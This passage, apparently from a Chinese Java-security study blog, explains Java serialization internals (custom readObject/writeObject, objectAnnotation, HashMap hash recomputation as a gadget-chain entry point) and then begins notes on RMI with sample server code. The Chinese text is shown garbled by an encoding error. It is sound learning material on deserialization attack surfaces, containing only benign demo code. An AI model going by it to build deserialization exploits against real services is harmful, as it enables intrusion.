å’Œ</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">__destruct</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">(é”€æ¯)ã€‚</font></td><td><font style="color:rgb(26, 28, 30);">æ¼æ´é€šå¸¸ç”±</font><strong><font style="color:rgb(26, 28, 30);">é­”æœ¯æ–¹æ³•</font></strong><font style="color:rgb(26, 28, 30);">è§¦å‘ï¼Œå±äºâ€œååºåˆ—åŒ–</font><strong><font style="color:rgb(26, 28, 30);">å</font></strong><font style="color:rgb(26, 28, 30);">â€çš„åˆå§‹åŒ–æ“ä½œã€‚</font></td></tr><tr><td><strong><font style="color:rgb(26, 28, 30);">Java</font></strong><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">(readObject)</font></td><td><strong><font style="color:rgb(26, 28, 30);">å¯¹è±¡é‡å»º</font></strong></td><td><font style="color:rgb(26, 28, 30);">ä¾§é‡äº</font><strong><font style="color:rgb(26, 28, 30);">è‡ªå®šä¹‰è¿˜åŸè¿‡ç¨‹</font></strong><font style="color:rgb(26, 28, 30);">ã€‚å…è®¸å¼€å‘è€…ä»‹å…¥ååºåˆ—åŒ–æµç¨‹ã€‚</font></td><td><font style="color:rgb(26, 28, 30);">æ¼æ´æºäº</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">readObject</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">æ–¹æ³•ã€‚å®ƒä¸ä»…è¿˜åŸå±æ€§ï¼Œè¿˜å…è®¸å¼€å‘è€…åœ¨è¿˜åŸ</font><strong><font style="color:rgb(26, 28, 30);">è¿‡ç¨‹ä¸­</font></strong><font style="color:rgb(26, 28, 30);">æ‰§è¡Œè‡ªå®šä¹‰ä»£ç ã€‚</font></td></tr></tbody></table><p><strong><font style="color:rgb(26, 28, 30);">ä¸€å¥è¯æ€»ç»“ï¼š</font></strong><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">Java çš„</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">readObject</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">å€¾å‘äºè§£å†³â€œå¦‚ä½•è¿˜åŸä¸€ä¸ªå®Œæ•´å¯¹è±¡â€çš„é—®é¢˜ï¼Œç»™äºˆäº†å¼€å‘è€…æå¤§çš„è‡ªç”±åº¦ï¼Œä¹ŸåŸ‹ä¸‹äº†éšæ‚£ã€‚</font></p><hr><h2 id="l8iTu"><font style="color:rgb(26, 28, 30);">3. Java åºåˆ—åŒ–æ ¸å¿ƒæœºåˆ¶</font></h2><h3 id="FqTuk"><font style="color:rgb(26, 28, 30);">3.1 ä¸¤ä¸ªå…³é”®æ–¹æ³•</font></h3><font style="color:rgb(26, 28, 30);">å¼€å‘è€…å¯ä»¥åœ¨ç±»ä¸­é‡å†™ä»¥ä¸‹ä¸¤ä¸ªç§æœ‰æ–¹æ³•ï¼Œæ¥å¹²é¢„åºåˆ—åŒ–è¿‡ç¨‹ï¼š</font><ul><li><strong><font style="color:rgb(50, 48, 44);">writeObject(ObjectOutputStream s)</font></strong><font style="color:rgb(26, 28, 30);">:</font><ul><li><font style="color:rgb(26, 28, 30);">å†³å®šå¦‚ä½•æŠŠå¯¹è±¡å†™å…¥æµã€‚</font></li><li><font style="color:rgb(26, 28, 30);">é€šå¸¸å…ˆè°ƒç”¨</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">s.defaultWriteObject()</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">å†™å…¥é»˜è®¤å±æ€§ã€‚</font></li><li><strong><font style="color:rgb(26, 28, 30);">å…³é”®ç‚¹</font></strong><font style="color:rgb(26, 28, 30);">ï¼šå¯ä»¥è°ƒç”¨</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">s.writeObject()</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">å†™å…¥</font><strong><font style="color:rgb(26, 28, 30);">é¢å¤–çš„æ•°æ®</font></strong><font style="color:rgb(26, 28, 30);">ï¼ˆç§è´§ï¼‰ã€‚</font></li></ul></li><li><strong><font style="color:rgb(50, 48, 44);">readObject(ObjectInputStream s)</font></strong><font style="color:rgb(26, 28, 30);">:</font><ul><li><font style="color:rgb(26, 28, 30);">å†³å®šå¦‚ä½•ä»æµé‡Œæ¢å¤å¯¹è±¡ã€‚</font></li><li><font style="color:rgb(26, 28, 30);">é€šå¸¸å…ˆè°ƒç”¨</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">s.defaultReadObject()</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">æ¢å¤é»˜è®¤å±æ€§ã€‚</font></li><li><strong><font style="color:rgb(26, 28, 30);">å…³é”®ç‚¹</font></strong><font style="color:rgb(26, 28, 30);">ï¼šå¿…é¡»æŒ‰ç…§å†™å…¥é¡ºåºï¼Œè°ƒç”¨</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">s.readObject()</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">è¯»å–é‚£äº›</font><strong><font style="color:rgb(26, 28, 30);">é¢å¤–çš„æ•°æ®</font></strong><font style="color:rgb(26, 28, 30);">ï¼Œå¹¶è¿›è¡Œå¤„ç†ã€‚</font></li></ul></li></ul><h3 id="wi1N7"><font style="color:rgb(26, 28, 30);">3.2 ä»£ç ç¤ºä¾‹ (å¤¹å¸¦ç§è´§)</font></h3><p><font style="color:rgb(93, 93, 95);"></font><strong><font style="color:rgb(28, 27, 27);">Java</font></strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-comment">// ä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼ŒæŠŠ Person ç±»å’Œä¸»ç±»å†™åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œ</span><br><span class="hljs-comment">// Person ç±»å»æ‰ publicï¼Œåªèƒ½åœ¨å½“å‰æ–‡ä»¶ä½¿ç”¨</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br><br>    <span class="hljs-comment">// è‡ªå®šä¹‰åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        s.defaultWriteObject(); <span class="hljs-comment">// å†™å…¥é»˜è®¤å±æ€§ (name)</span><br>        s.writeObject(<span class="hljs-string">&quot;This is extra data&quot;</span>); <span class="hljs-comment">// ã€ç§è´§ã€‘å†™å…¥é¢å¤–æ•°æ®</span><br>    &#125;<br><br>    <span class="hljs-comment">// è‡ªå®šä¹‰ååºåˆ—åŒ–</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject(); <span class="hljs-comment">// è¯»å–é»˜è®¤å±æ€§</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> (String) s.readObject(); <span class="hljs-comment">// ã€ç§è´§ã€‘è¯»å–é¢å¤–æ•°æ®</span><br>        System.out.println(<span class="hljs-string">&quot;ååºåˆ—åŒ–æˆåŠŸï¼Œè¯»åˆ°çš„ç§è´§æ˜¯: &quot;</span> + msg);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;å¼€å§‹è¿è¡Œ...&quot;</span>);<br><br>        <span class="hljs-comment">// 1. åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        p.name = <span class="hljs-string">&quot;Hacker&quot;</span>;<br><br>        <span class="hljs-comment">// 2. å‡†å¤‡åºåˆ—åŒ–æµ</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br><br>        <span class="hljs-comment">// 3. å¼€å§‹åºåˆ—åŒ–</span><br>        oos.writeObject(p);<br>        oos.close();<br><br>        <span class="hljs-comment">// 4. è·å–åºåˆ—åŒ–åçš„äºŒè¿›åˆ¶æ•°æ®</span><br>        <span class="hljs-type">byte</span>[] bytes = baos.toByteArray();<br><br>        <span class="hljs-comment">// 5. æ‰“å° 16 è¿›åˆ¶</span><br>        System.out.println(<span class="hljs-string">&quot;=== åºåˆ—åŒ–æ•°æ®çš„ 16 è¿›åˆ¶å±•ç¤º ===&quot;</span>);<br>        printHex(bytes);<br><br>        <span class="hljs-comment">// 6. ä¿å­˜åˆ°æ–‡ä»¶ person.bin (ä¼šåœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹ç”Ÿæˆ)</span><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;person.bin&quot;</span>)) &#123;<br>            fos.write(bytes);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;\n[+] æ–‡ä»¶å·²ä¿å­˜ä¸º person.bin&quot;</span>);<br><br>        <span class="hljs-comment">// 7. éªŒè¯ååºåˆ—åŒ–</span><br>        System.out.println(<span class="hljs-string">&quot;\n=== æ­£åœ¨å°è¯•ååºåˆ—åŒ–... ===&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>        ois.readObject();<br>    &#125;<br><br>    <span class="hljs-comment">// è¾…åŠ©å·¥å…·ï¼šæŠŠå­—èŠ‚æ•°ç»„æ‰“å°æˆæ¼‚äº®çš„ Hex æ ¼å¼</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printHex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; bytes.length; i++) &#123;<br>            System.out.printf(<span class="hljs-string">&quot;%02X&quot;</span>, bytes[i]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="udOqv"><font style="color:rgb(26, 28, 30);">4. åºåˆ—åŒ–æ•°æ®çš„å†…éƒ¨ç»“æ„ (åº•å±‚åè®®)</font></h2><font style="color:rgb(26, 28, 30);">é€šè¿‡</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">SerializationDumper</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">åˆ†æ 16 è¿›åˆ¶æ•°æ®ï¼Œå¯ä»¥å‘ç° Java åºåˆ—åŒ–æµä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„åŒºåŸŸï¼š</font><p><img src="https://cdn.nlark.com/yuque/0/2025/png/57713373/1765960580218-64d71bf0-7f9e-4c1f-8fdd-6bcdd4470527.png"></p><h3 id="bhQdl"><font style="color:rgb(50, 48, 44);">objectAnnotation</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">(å¯¹è±¡æ³¨è§£/é™„æ³¨)</font></h3><ul><li><strong><font style="color:rgb(26, 28, 30);">å®šä¹‰</font></strong><font style="color:rgb(26, 28, 30);">ï¼šå½“ç±»å®ç°äº†</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">writeObject</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">æ–¹æ³•æ—¶ï¼Œå®ƒå†™å…¥çš„æ‰€æœ‰è‡ªå®šä¹‰æ•°æ®ï¼ˆå³ä¸Šé¢çš„â€œç§è´§â€ï¼‰ï¼Œéƒ½ä¼šè¢«å­˜å‚¨åœ¨</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">TC_OBJECT</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">ä¸‹é¢çš„</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">objectAnnotation</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">å—ä¸­ã€‚</font></li><li><strong><font style="color:rgb(26, 28, 30);">å¯¹æ¯”</font></strong><font style="color:rgb(26, 28, 30);">ï¼š</font><ul><li><strong><font style="color:rgb(50, 48, 44);">classAnnotations</font></strong><font style="color:rgb(26, 28, 30);">: (RMI ç¯‡æåˆ°) å­˜å‚¨ç±»åŠ è½½è·¯å¾„ï¼ˆCodebase URLï¼‰ï¼Œç”±</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">annotateClass</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">å†™å…¥ã€‚</font></li><li><strong><font style="color:rgb(50, 48, 44);">objectAnnotation</font></strong><font style="color:rgb(26, 28, 30);">: å­˜å‚¨å¯¹è±¡è‡ªå®šä¹‰æ•°æ®ï¼Œç”±</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">writeObject</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">å†™å…¥ã€‚</font></li></ul></li></ul><h3 id="fSVWG"><font style="color:rgb(26, 28, 30);">ä¸ºä»€ä¹ˆå®ƒå¾ˆé‡è¦ï¼Ÿ</font></h3><ul><li><strong><font style="color:rgb(26, 28, 30);">HashMap çš„ä¾‹å­</font></strong><font style="color:rgb(26, 28, 30);">ï¼š</font><font style="color:rgb(50, 48, 44);">HashMap</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">å¹¶æ²¡æœ‰æŠŠé”®å€¼å¯¹ï¼ˆKey-Valueï¼‰å½“æˆé»˜è®¤å±æ€§å­˜å‚¨ï¼Œè€Œæ˜¯å…¨å†™è¿›äº†</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">objectAnnotation</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">é‡Œã€‚</font></li><li><strong><font style="color:rgb(26, 28, 30);">æ¼æ´ä¼ç¬”</font></strong><font style="color:rgb(26, 28, 30);">ï¼šååºåˆ—åŒ–</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">HashMap</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">æ—¶ï¼Œ</font><font style="color:rgb(50, 48, 44);">readObject</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">ä¼šä»è¿™ä¸ªåŒºåŸŸè¯»å‡º Keyï¼Œå¹¶</font><strong><font style="color:rgb(26, 28, 30);">é‡æ–°è®¡ç®— Key çš„ Hash å€¼</font></strong><font style="color:rgb(26, 28, 30);">ã€‚è¿™ä¸€è®¡ç®—è¿‡ç¨‹ï¼ˆ</font><font style="color:rgb(50, 48, 44);">hashCode()</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">æ–¹æ³•çš„è°ƒç”¨ï¼‰æ˜¯ä¼—å¤šååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼ˆGadget Chainï¼‰çš„</font><strong><font style="color:rgb(26, 28, 30);">ç¬¬ä¸€å¼ å¤šç±³è¯ºéª¨ç‰Œ</font></strong><font style="color:rgb(26, 28, 30);">ï¼ˆå¦‚ URLDNS é“¾ï¼‰ã€‚</font></li></ul><hr><h2 id="Ic9bD"><font style="color:rgb(26, 28, 30);">5. æ€»ç»“ä¸å®¡è®¡æ€è·¯</font></h2><ul><li><strong><font style="color:rgb(26, 28, 30);">æ”»å‡»é¢</font></strong><font style="color:rgb(26, 28, 30);">ï¼šä»»ä½•æ¥æ”¶äºŒè¿›åˆ¶æµå¹¶æ‰§è¡Œ</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">readObject</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">çš„åœ°æ–¹ï¼ˆRMI, JMX, WebLogic, Jenkins ç­‰ï¼‰ã€‚</font></li><li><strong><font style="color:rgb(26, 28, 30);">åˆ©ç”¨æ ¸å¿ƒ</font></strong><font style="color:rgb(26, 28, 30);">ï¼š</font><ul><li><font style="color:rgb(26, 28, 30);">æ”»å‡»è€…æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ã€‚</font></li><li><font style="color:rgb(26, 28, 30);">æœåŠ¡ç«¯åœ¨</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">readObject</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">è¿˜åŸå¯¹è±¡æ—¶ï¼Œè‡ªåŠ¨è§¦å‘äº†æ¶æ„çš„ä»£ç é€»è¾‘ã€‚</font></li></ul></li><li><strong><font style="color:rgb(26, 28, 30);">åç»­å­¦ä¹ </font></strong><font style="color:rgb(26, 28, 30);">ï¼š</font><ul><li><font style="color:rgb(26, 28, 30);">æ—¢ç„¶</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">HashMap</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">åœ¨ååºåˆ—åŒ–æ—¶ä¼šé‡ç®— Hashï¼Œå¦‚æœæˆ‘æŠŠä¸€ä¸ª URL å¯¹è±¡æ”¾è¿› HashMap é‡Œï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</font></li><li><font style="color:rgb(26, 28, 30);">è¿™å°±æ˜¯ä¸‹ä¸€ç¯‡è¦å­¦çš„</font><font style="color:rgb(26, 28, 30);"> </font><strong><font style="color:rgb(26, 28, 30);">URLDNS åˆ©ç”¨é“¾</font></strong><font style="color:rgb(26, 28, 30);">ã€‚</font></li></ul></li></ul><hr><p><strong><font style="color:rgb(26, 28, 30);">å¤ä¹ å°è´´å£«</font></strong><font style="color:rgb(26, 28, 30);">ï¼š<br></font><font style="color:rgb(26, 28, 30);">åªè¦çœ‹åˆ° </font><font style="color:rgb(50, 48, 44);">implements Serializable</font><font style="color:rgb(26, 28, 30);">ï¼Œå°±è¦æ¡ä»¶åå°„åœ°å»æ‰¾æœ‰æ²¡æœ‰ </font><font style="color:rgb(50, 48, 44);">readObject</font><font style="color:rgb(26, 28, 30);"> æ–¹æ³•ã€‚å¦‚æœæœ‰ï¼Œä»”ç»†çœ‹å®ƒåœ¨è¿˜åŸå¯¹è±¡æ—¶ï¼Œæ˜¯ä¸æ˜¯å¤„ç†äº†ä»€ä¹ˆä¸å—ä¿¡ä»»çš„â€œç§è´§â€ã€‚</font></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>javasec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javasec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>javaå®‰å…¨å­¦ä¹ ç¬”è®°2</title>
    <link href="/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/"/>
    <url>/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</url>
    
    <content type="html"><![CDATA[<h1 id="cWqfv">åŸºç¡€çŸ¥è¯†</h1>RMIçš„ä¸‰ä¸ªç»„æˆéƒ¨åˆ†ï¼š<ul><li>Registryï¼šç±»ä¼¼ç”µè¯ç°¿ã€‚åªè´Ÿè´£è®°å½•å“ªä¸ªåå­—å¯¹åº”å“ªä¸ªå¯¹è±¡ã€‚</li><li>Serverï¼šçœŸæ­£å¹²æ´»çš„äººï¼Œæä¾›å®é™…çš„å‡½æ•°é€»è¾‘ï¼Œå¹¶æŠŠè‡ªå·±çš„å¼•ç”¨æ³¨å†Œåˆ°Registryä¸Šã€‚</li><li>Clientï¼šè°ƒç”¨è€…ã€‚å…ˆæŸ¥Registryï¼Œæ‹¿åˆ°Serverçš„å­˜æ ¹ï¼ˆstubï¼‰ï¼Œç„¶åç›´æ¥æ‰¾ServeråŠäº‹ã€‚</li></ul><p>RMIçš„è¿æ¥è¿‡ç¨‹ï¼š</p><ul><li>ç¬¬ä¸€æ¬¡è¿æ¥ï¼šClient-&gt;Registryï¼ˆ1099ç«¯å£ï¼‰</li></ul><blockquote><p>clienté—®Helloåœ¨å“ªï¼ŸRegistryå›ç­”Helloåœ¨192.168.x.xçš„33789ç«¯å£ã€‚è¿™é‡Œä¼ è¾“åºåˆ—åŒ–æ•°æ®ã€‚</p></blockquote><ul><li>ç¬¬äºŒæ¬¡è¿æ¥ï¼šClient-&gt;Server(éšæœºçš„33789ç«¯å£)</li></ul><blockquote><p>Clientè¯´æˆ‘è¦è°ƒç”¨hello()æ–¹æ³•ã€‚Serveræ‰§è¡Œåè¿”å›ç»“æœã€‚</p></blockquote><p>ç®€å•RMIå®ç°ä»£ç (å› ä¸ºæ²¡ç³»ç»Ÿå­¦è¿‡Javaï¼Œæ‰€ä»¥æœ‰ä¸€äº›ç–‘é—®æˆ‘è®©aiç»™äº†æ³¨é‡Šæ”¾é‡Œé¢äº†)ï¼š</p><p>Server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.vulhub.RMI; <span class="hljs-comment">// å‡è®¾åŒ…åä¸º org.vulhub.RMI</span><br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-comment">// ã€é—®é¢˜ 3 è§£ç­”ã€‘ï¼šä¸ºä»€ä¹ˆåªæœ‰å®šä¹‰ï¼Ÿ</span><br>    <span class="hljs-comment">// Cè¯­è¨€ç±»æ¯”ï¼šè¿™ç›¸å½“äº .h å¤´æ–‡ä»¶ã€‚</span><br>    <span class="hljs-comment">// Pythonç±»æ¯”ï¼šç›¸å½“äºæŠ½è±¡åŸºç±» (Abstract Base Class)ã€‚</span><br>    <span class="hljs-comment">// ä½œç”¨ï¼šè¿™æ˜¯ä¸€ä»½â€œå¥‘çº¦/èœå•â€ã€‚å®¢æˆ·ç«¯åœ¨æœ¬åœ°æ²¡æœ‰æœåŠ¡ç«¯çš„å…·ä½“ä»£ç ï¼Œ</span><br>    <span class="hljs-comment">// ä½†åªè¦æ‰‹é‡Œæœ‰è¿™ä»½æ¥å£å®šä¹‰ï¼Œå°±çŸ¥é“æœåŠ¡ç«¯æä¾›äº†ä»€ä¹ˆæ–¹æ³•ï¼Œä»è€Œæ•¢æ”¾å¿ƒè°ƒç”¨ã€‚</span><br>    <span class="hljs-comment">// extends Remoteï¼šè¿™æ˜¯ RMI çš„ç¡¬æ€§è§„å®šï¼Œæ ‡è®°è¯¥æ¥å£å¯è¢«è¿œç¨‹è°ƒç”¨ã€‚</span><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        <span class="hljs-comment">// å¿…é¡»æŠ›å‡º RemoteExceptionï¼Œå› ä¸ºç½‘ç»œé€šä¿¡æ˜¯ä¸å¯é çš„ï¼Œå®¢æˆ·ç«¯éœ€è¦å¤„ç†ç½‘ç»œé”™è¯¯</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-comment">// ã€é—®é¢˜ 1 è§£ç­”ã€‘ï¼šä¸ºä»€ä¹ˆå®šä¹‰å†…éƒ¨ç±»ï¼Ÿä¸ºä»€ä¹ˆæ„é€ å‡½æ•°æŠ›å¼‚å¸¸ï¼Ÿ</span><br>    <span class="hljs-comment">// 1. å†…éƒ¨ç±»ï¼šçº¯ç²¹ä¸ºäº†çœäº‹ï¼ˆæ¼”ç¤ºæ–¹ä¾¿ï¼‰ï¼Œä¸ç”¨æ–°å»ºä¸€ä¸ª .java æ–‡ä»¶ã€‚</span><br>    <span class="hljs-comment">//    å°±åƒ Python åœ¨ä¸€ä¸ªè„šæœ¬é‡Œå†™å¤šä¸ª classã€‚åœ¨çœŸå®å·¥ç¨‹ä¸­é€šå¸¸æ˜¯ç‹¬ç«‹æ–‡ä»¶ã€‚</span><br>    <span class="hljs-comment">// 2. æŠ›å¼‚å¸¸ï¼šè¿™æ˜¯ Java ç‰¹æœ‰çš„â€œæ£€æŸ¥å‹å¼‚å¸¸â€æœºåˆ¶ã€‚</span><br>    <span class="hljs-comment">//    